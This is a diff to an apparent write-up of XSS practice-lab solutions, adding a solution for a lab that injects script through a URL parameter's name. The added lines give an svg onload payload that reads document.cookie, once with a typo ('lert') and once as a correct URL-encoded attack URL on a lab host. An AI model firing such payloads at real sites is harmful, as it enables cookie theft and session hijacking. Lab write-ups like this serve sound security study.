@@ -544,8 +544,16 @@ document.getElementById('tracker').firstChild.innerHTML = clean;
 
 ### Lab 856: Parameter Name 2
 - **URL Lab**: https://xssy.uk/lab/856
-- **Status**: Not solved yet
-- **Description**: Need fuzzing to find hidden parameter. Reference: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
+- **Payload**: 
+```
+name<svg onload=lert(document.cookie)>=<h1>something
+```
+- **Full URL**: 
+```
+https://77my5mnd.hacky.uk/target.ftl?name%3Csvg%20onload%3Dalert(document.cookie)%3E=%3Ch1%3Esomething
+```
+- **Description**: instead of inject in value, we inject in parameter: name{payloadxssinhere}=something, maybe developer get the parameter name to dangerous sink
+---
 
 ---
 
